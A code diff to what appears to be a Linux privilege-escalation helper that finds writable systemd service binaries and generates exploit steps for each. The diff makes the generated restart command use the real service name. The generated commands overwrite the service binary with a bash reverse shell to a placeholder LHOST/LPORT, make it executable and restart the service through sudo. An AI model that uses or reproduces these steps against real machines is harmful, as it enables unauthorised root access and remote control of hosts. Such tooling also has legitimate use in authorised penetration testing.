@@ -24,16 +24,17 @@ def parse_service_binary_section(section_text: str) -> List[Dict]:
     return results
 
 
-def generate_commands(binary_path: str) -> List[str]:
+def generate_commands(binary_path: str, service_name: str = "") -> List[str]:
     """Generate exploit steps for a writable service binary."""
     bname = binary_path.split("/")[-1]
+    restart_target = service_name or "<service-name>"
     return [
         f"cp {binary_path} /tmp/{bname}.bak  # backup original",
         f"echo '#!/bin/bash' > {binary_path}",
         f"echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> {binary_path}",
         f"chmod +x {binary_path}",
         "# Restart the service (check sudo -l for restart command):",
-        "sudo systemctl restart <service-name>",
+        f"sudo systemctl restart {restart_target}",
         "# Or wait for the service to restart automatically",
     ]
 
@@ -46,13 +47,15 @@ def analyze(section_text: str) -> List[Dict]:
     findings: List[Dict] = []
     for entry in parse_service_binary_section(section_text):
         binary_path = entry["binary_path"]
+        service = entry["service"]
+        service_name = re.sub(r"\.(?:service|timer)$", "", service) if service else ""
         findings.append({
             "binary_path": binary_path,
-            "service": entry["service"],
+            "service": service,
             "severity": "HIGH",
             "type": "service_binary",
             "description": "writable binary called by a systemd service",
-            "commands": generate_commands(binary_path),
+            "commands": generate_commands(binary_path, service_name),
         })
     return findings
 
